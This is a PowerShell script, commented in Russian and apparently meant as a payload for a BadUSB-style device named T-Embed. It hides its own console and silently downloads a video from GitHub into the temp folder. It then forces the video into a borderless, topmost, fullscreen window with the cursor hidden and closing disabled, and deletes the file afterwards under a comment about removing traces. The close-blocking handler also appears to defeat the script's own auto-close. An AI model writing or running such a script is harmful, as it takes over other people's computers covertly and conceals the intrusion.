# 1. Скрываем консоль (через WinAPI, чтобы без ошибок)
try {
    $c = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'
    $t = Add-Type -MemberDefinition $c -Name "W" -Namespace "Win" -PassThru
    $t::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0)
} catch {}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName PresentationFramework,PresentationCore,WindowsBase

# 2. ФИКСИРОВАННЫЕ ПАРАМЕТРЫ
# Используем прямой домен raw.githubusercontent.com
$u = 'https://raw.githubusercontent.com/ymkeee/T-Embed/main/edit.mp4'
$f = "$env:TEMP\payload_video.mp4"

try {
    # Скачивание (флаг -ErrorAction Stop поймает 404, если файла нет)
    Invoke-WebRequest -Uri $u -OutFile $f -ErrorAction Stop

    # 3. ИНТЕРФЕЙС
    $xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        WindowStyle="None" WindowState="Maximized" Topmost="True" 
        Background="Black" Cursor="None" ShowInTaskbar="False">
    <Grid><MediaElement Name="v" Source="$f" LoadedBehavior="Play" Stretch="Uniform" /></Grid>
</Window>
"@

    $reader = New-Object System.Xml.XmlNodeReader ([xml]$xaml)
    $w = [Windows.Markup.XamlReader]::Load($reader)
    $v = $w.FindName("v")

    # Автозакрытие по окончании видео
    $v.add_MediaEnded({ $w.Close() })
    
    # Блокировка закрытия через Alt+F4
    $w.Add_Closing({ $_.Cancel = $true })

    $w.ShowDialog() | Out-Null
} 
catch {
    # Если не скачалось, но файл остался от прошлого раза - запустим его
    if (Test-Path $f) {
        $w = [Windows.Markup.XamlReader]::Load((New-Object System.Xml.XmlNodeReader ([xml]$xaml)))
        $w.ShowDialog() | Out-Null
    }
}
finally {
    # 4. УДАЛЕНИЕ СЛЕДОВ
    Start-Sleep -Seconds 1
    if (Test-Path $f) { 
        Remove-Item $f -Force -ErrorAction SilentlyContinue 
    }
}
